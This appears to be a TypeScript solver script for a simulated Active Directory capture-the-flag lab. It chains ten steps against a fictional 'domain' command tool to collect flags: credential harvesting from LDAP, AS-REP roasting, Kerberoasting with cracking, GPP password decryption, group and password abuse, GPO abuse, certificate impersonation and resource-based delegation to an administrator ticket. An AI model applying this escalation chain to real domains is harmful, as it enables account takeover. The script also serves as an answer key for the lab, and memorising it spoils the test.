export async function solveDomain(
  run: (command: string) => Promise<string>,
  deliver: (id: string, flag: string) => Promise<void>,
) {
  const credentials: Record<string, string> = {};
  async function proof(index: number, command: string) {
    const output = await run(command),
      flag = output.match(/CTF\{[a-f0-9]{32}\}/)?.[0];
    if (!flag) throw new Error(`No se recuperó la evidencia ${index}.`);
    await deliver(`ad-${String(index).padStart(2, "0")}`, flag);
    return flag;
  }
  const auth = (user: string, password: string) =>
    ` -u ${JSON.stringify(user)} -p ${JSON.stringify(password)}`;
  await run("domain scan");
  await proof(1, "domain smb Publico relevo.txt");
  const users = await run("domain ldap users");
  credentials.practicas = users.match(/Alta temporal: ([^;]+);/)?.[1] ?? "";
  if (!credentials.practicas)
    throw new Error("No se encontró el registro de alta.");
  await proof(
    2,
    "domain smb Usuarios control.txt" +
      auth("practicas", credentials.practicas),
  );
  await run("domain capture asrep archivo");
  credentials.archivo =
    (await run("domain crack asrep-archivo.json diccionario.txt")).match(
      /^archivo:([^\n]+)/,
    )?.[1] ?? "";
  await proof(
    3,
    "domain smb Archivo control.txt" + auth("archivo", credentials.archivo),
  );
  await run(
    "domain capture tgs svc_reportes" + auth("archivo", credentials.archivo),
  );
  credentials.svc_reportes =
    (await run("domain crack tgs-svc_reportes.json diccionario.txt")).match(
      /^svc_reportes:([^\n]+)/,
    )?.[1] ?? "";
  await proof(
    4,
    "domain smb Reportes control.txt" +
      auth("svc_reportes", credentials.svc_reportes),
  );
  await run(
    "domain smb SYSVOL Groups.xml" + auth("practicas", credentials.practicas),
  );
  credentials.mantenimiento =
    (await run("domain decrypt Groups.xml")).match(
      /mantenimiento:([^\n]+)/,
    )?.[1] ?? "";
  await proof(
    5,
    "domain winrm C:/ProgramData/Mantenimiento/control.txt" +
      auth("mantenimiento", credentials.mantenimiento),
  );
  await run(
    "domain group add Despliegue practicas" +
      auth("practicas", credentials.practicas),
  );
  await proof(
    6,
    "domain smb Despliegue control.txt" +
      auth("practicas", credentials.practicas),
  );
  credentials.auditoria = "Control-nuevo-2026!";
  await run(
    "domain password auditoria " +
      JSON.stringify(credentials.auditoria) +
      auth("practicas", credentials.practicas),
  );
  await proof(
    7,
    "domain smb Controles control.txt" +
      auth("auditoria", credentials.auditoria),
  );
  await run(
    "domain gpo set ExportarInforme" + auth("practicas", credentials.practicas),
  );
  await run("domain gpo apply" + auth("practicas", credentials.practicas));
  await proof(
    8,
    "domain winrm C:/Lab/Resultados/politica.txt" +
      auth("mantenimiento", credentials.mantenimiento),
  );
  await run(
    "domain cert Visita responsable" + auth("practicas", credentials.practicas),
  );
  await proof(
    9,
    "domain smb Direccion control.txt --ticket cert-responsable.json",
  );
  await run(
    "domain machine ANALISTA$ Equipo-Lab-2026!" +
      auth("practicas", credentials.practicas),
  );
  await run(
    "domain delegate WS01 ANALISTA$" + auth("practicas", credentials.practicas),
  );
  await run("domain ticket ANALISTA$ administrador -p Equipo-Lab-2026!");
  await proof(
    10,
    "domain smb C$ Lab/Pruebas/custodia.txt --ticket ticket-ws01.json",
  );
  return credentials;
}
